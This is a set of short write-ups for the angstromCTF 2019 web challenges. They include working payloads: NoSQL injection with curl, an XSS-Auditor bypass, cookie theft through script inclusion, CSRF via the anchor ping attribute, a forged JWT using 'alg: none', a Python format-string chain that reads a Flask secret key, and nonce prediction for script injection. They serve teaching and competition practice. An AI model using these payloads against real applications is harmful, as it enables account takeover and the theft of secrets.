ångstromCTF 2019 -- quick write-ups by @terjanq (Web)
===

# Control You
The flag was in the source code of the webpage **actf{control_u_so_we_can't_control_you}**

# No Sequels
This was a basic NoSQL Injection task.
```shell
curl -i https://nosequels.2019.chall.actf.co/login \
-H 'Content-type: application/json' \
-d '{"username": "admin", "password": {"$gt": "a"}}' \
-H 'Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRoZW50aWNhdGVkIjpmYWxzZSwiaWF0IjoxNTU1NzE4OTc5fQ.-YQh71DMt2mRIwKmgAKIB16rliriYF4dSilCsYo84-8'
```
After executing the above command we get a session cookie for the admin and when visiting the `https://nosequels.2019.chall.actf.co/site` we get the flag.
**actf{no_sql_doesn't_mean_no_vuln}**

# No Sequels 2
This was the same task as before but here we had to use blind NoSQL injection in order to fetch all of the pasword's characters by using the payload above. E.g.
```
{"username": "admin", "password": {"$gt": "a"}} -> true
{"username": "admin", "password": {"$gt": "z"}} -> false
```

By bruteforcing all characters we get the password `congratsyouwin` and then the flag: **actf{still_no_sql_in_the_sequel}**

Solving script: [./NoSequels2/solve.py](./NoSequels2/solve.py)

# DOM Validator

*Detailed writeup available here: https://medium.com/@terjanq/xss-auditor-the-protector-of-unprotected-f900a5e15b7b*

We had a simple upload page that allowed you to upload a custom HTML page. You could report suspicious URLs to admin.
After uploading the page we get:
```htmlmixed

<!DOCTYPE html SYSTEM "3b16c602b53a3e4fc22f0d25cddb0fc4d1478e0233c83172c36d0a6cf46c171ed5811fbffc3cb9c3705b7258179ef11362760d105fb483937607dd46a6abcffc">
<html>
	<head>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/skeleton/2.0.4/skeleton.min.css">
		<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/sha512.js"></script>
		<script src="../scripts/DOMValidator.js"></script>
	</head>
	<body>
		<h1>test_post</h1>
		<p><script>alert('pwned')</script></p>
	</body>
</html>
```

The `<script>alert('pwned')</script>` won't be executed because of the `DOMValidator.js` script:

```javascript
function checksum (element) {
	var string = ''
	string += (element.attributes ? element.attributes.length : 0) + '|'
	for (var i = 0; i < (element.attributes ? element.attributes.length : 0); i++) {
		string += element.attributes[i].name + ':' + element.attributes[i].value + '|'
	}
	string += (element.childNodes ? element.childNodes.length : 0) + '|'
	for (var i = 0; i < (element.childNodes ? element.childNodes.length : 0); i++) {
		string += checksum(element.childNodes[i]) + '|'
	}
	return CryptoJS.SHA512(string).toString(CryptoJS.enc.Hex)
}
var request = new XMLHttpRequest()
request.open('GET', location.href, false)
request.send(null)
if (checksum((new DOMParser()).parseFromString(request.responseText, 'text/html')) !== document.doctype.systemId) {
	document.documentElement.remove()
}
```

It calculates some sort document's hash and then compares it with the original. I haven't even looked into the code because I already knew an unintended solution for this one. 

The page wasn't setting any `X-XSS-Protection` header so the `XSS-Auditor` in Chrome 74 (that's the version the admin uses) is set to `mode=filter` so any reflected XSS will be filtered and not executed. 

So I appended the `xss=<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/sha512.js">` parameter to the query so the `sha512.js` script will be filtered and the `DOMValidator.js` will crash. Hence, `<script>alert('pwned')</script>` will be executed.

![](https://i.imgur.com/gso11nh.png)

After sending that URL to the admin we get the flag: **actf{its_all_relative}**

# Cookie Monster
Once again, we've got a simple webpage with URL reporting functionality. After a quick inspection we see two endpoints `/getflag` and `/cookies`. When visiting `/cookies` our `cookies` are being displayed and it looks like `user_DE7aL1xDCe3BauCWqSVqg_0C5bu2078UgQHIqYsF2h0= 311`. That's a valid variable in JavaScript so by including this script on the prepared website 
```
<script src='https://cookiemonster.2019.chall.actf.co/cookies'></script>
```
and then read the window variable
```javascript
var name = Object.getOwnPropertyNames(window).filter(x=>x.indexOf('admin')!=-1)[0];
```
we get the admin's cookie `admin_GgxUa7MQ7UVo5JHFGLbqzuQfFFy4EDQNwZWAWJXS5_o=` and then the flag: **actf{defund_is_the_real_cookie_monster}**

# GiantURL
We have a domain where we can:
- create `redirect` URL `GET /redirect`
- change admin's password `POST /admin/changepass`
- report URL `POST /report`

The website is not protected by any CSRF tokens but the `SameSite=Lax` cookie is set so we can't do any `POST` requests across different origins.

```php
<?php
if ($path === '/admin/changepass' && $_SERVER['REQUEST_METHOD'] === 'POST' && $_SESSION["admin"] === "true") {
    if (strlen($_REQUEST['password']) >= 100 && count(array_unique(str_split($_REQUEST['password']))) > 10) {
        $password = $_REQUEST['password'];
        echo 'Successfully changed password.';
    } else {
        echo 'Password is insecure.';
    }
}
file_put_contents("password", $password);
?>
```

In order to get the flag we have to somehow change the admin's password. We can see that it must be a `POST` request but the `password` can be passed as a URL parameter.

In the `/redirect` we have a vulnerable code:
```php
Click on <a href=<?php echo htmlspecialchars($_REQUEST['url']); ?>>this link</a> to go to your page!
```

In theory we could insert the xss there, like for example: `<a href=aa onclick=alert()>this link</a>` but CSP will block such attempts because of the
`Content-Security-Policy: default-src 'self'; style-src 'unsafe-inline';` header.

However, there is a `ping` feature in `<a>` elements that sends a `POST` request when the link was clicked. So we can insert `<a href=aa ping="/admin/changepass?password=LONG_PASSWORD">this link</a>` in the `/redirect` so when an admin clicks on that URL their password will change. The full payload:
`
https://giant_url.2019.chall.actf.co/redirect?url=aa%20ping=/admin/changepass?password=0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a0123456789a
`

When admin visits our website we can log in using the new credentials. By doing that we get the flag: **actf{p1ng_p0ng_9b05891fa9c3bed74d02a349877b1c60}**

# Cookie Cutter
The chalange is about hacking the JWT cookie. 
To get the flag we have to pass this check:
```javascript
let sid = JSON.parse(Buffer.from(cookie.split(".")[1], 'base64').toString()).secretid;
if(sid==undefined||sid>=secrets.length||sid<0){throw "invalid sid"}
let decoded = jwt.verify(cookie, secrets[sid]);
if(decoded.perms=="admin"){
    res.locals.flag = true;
}
```
where the `secrets` is an array containing randomly generated `secrets`

```javascript
let secret = crypto.randomBytes(32)
cookie = jwt.sign({perms:"user",secretid:secrets.length,rolled:res.locals.rolled?"yes":"no"}, secret, {algorithm: "HS256"});
secrets.push(secret);
```

The cookie looks like:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "perms": "user",
  "secretid": 1394,
  "rolled": "no",
  "iat": 1555925889
}
```

By providing the cookie: `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJwZXJtcyI6ImFkbWluIiwic2VjcmV0aWQiOiJyYW5kb21zdHIiLCJyb2xsZWQiOiJubyJ9.` which after decode looks like

```json
{
  "typ": "JWT",
  "alg": "none"
}
{
  "perms": "admin",
  "secretid": "randomstr",
  "rolled": "no"
}
```
We will get the flag, becasue `secrets["randomstr"]` will return `undefined` and we set the `algorithm` to `none`.

The flag is: **actf{defund_ate_the_cookies_and_left_no_sign}**

# Madlibbin
In the challenge we could insert a template string that will be interpreted in Python's `"".format(args=request.args)` function. So the string `{args}` will return `ImmutableMultiDict([])`. The goal was to read `app.secret_key` value. 

By running the server locally and using the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py, I found out the chain of properties that led to `Flask.app` object `{args.__class__.__weakref__.__objclass__._iter_hashitems.__globals__[__loader__].__class__.__weakref__.__objclass__.get_data.__globals__[__loader__].exec_module.__globals__[__builtins__][__build_class__].__self__.copyright.__class__._Printer__setup.__globals__[sys].modules[flask].current_app.secret_key}`.

And the flag is: **actf{traversed_the_world_and_the_seven_seas}**

Solving script: [./Madlibbin/app.py](./Madlibbin/app.py) `$ python3 -m flask run`
# NaaS
It was a basic task for cracking the Python's `random` generator. The solution was to request enough `nonces` from `https://naas.2019.chall.actf.co/nonceify` to predict the upcoming ones. To crack the `random` generator I used the tool: https://github.com/tna0y/Python-random-module-cracker. 

After successful prediction of the nonces you only had to create a paste with `<script nonce=Nonce1></script><script nonce=Nonce2></script><script nonce=Nonce3></script>...` so you can be sure that when the admin visits the page one of them will work.

After getting the admin's cookie we get the flag: **actf{lots_and_lots_of_nonces}**

Solving script: [./NaaS/solve.py](./NaaS/solve.py)